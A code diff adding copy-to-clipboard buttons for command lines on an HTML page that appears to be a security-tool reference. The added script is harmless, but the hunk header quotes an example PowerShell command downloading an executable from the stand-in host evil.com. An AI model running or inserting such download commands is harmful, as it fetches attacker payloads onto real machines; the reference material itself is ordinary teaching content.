@@ -426,6 +426,55 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
             searchInput.focus();
         }
     });
+
+    // Add Copy Buttons to Flags
+    document.querySelectorAll('.tool-flags').forEach(flagsContainer => {
+        const fragment = document.createDocumentFragment();
+
+        flagsContainer.childNodes.forEach(node => {
+            if (node.nodeType === Node.TEXT_NODE && node.textContent.trim()) {
+                const commandText = node.textContent.trim();
+
+                const wrapper = document.createElement('div');
+                wrapper.className = 'command-wrapper';
+
+                const code = document.createElement('code');
+                code.className = 'command-code';
+                code.textContent = commandText;
+
+                const btn = document.createElement('button');
+                btn.className = 'copy-btn';
+                btn.ariaLabel = 'Copy command';
+                btn.innerHTML = '📋';
+                btn.title = 'Copy to clipboard';
+
+                btn.onclick = () => {
+                    navigator.clipboard.writeText(commandText).then(() => {
+                        btn.innerHTML = '✅';
+                        setTimeout(() => btn.innerHTML = '📋', 2000);
+                    }).catch(err => {
+                        console.error('Failed to copy: ', err);
+                        // Fallback?
+                        btn.innerHTML = '❌';
+                        setTimeout(() => btn.innerHTML = '📋', 2000);
+                    });
+                };
+
+                wrapper.appendChild(code);
+                wrapper.appendChild(btn);
+                fragment.appendChild(wrapper);
+            } else {
+                // Keep element nodes (e.g. strong tags)
+                // Also keep whitespace if needed? No, block elements handle layout.
+                if (node.nodeType === Node.ELEMENT_NODE) {
+                    fragment.appendChild(node.cloneNode(true));
+                }
+            }
+        });
+
+        flagsContainer.innerHTML = '';
+        flagsContainer.appendChild(fragment);
+    });
   </script>
 </body>
 </html>
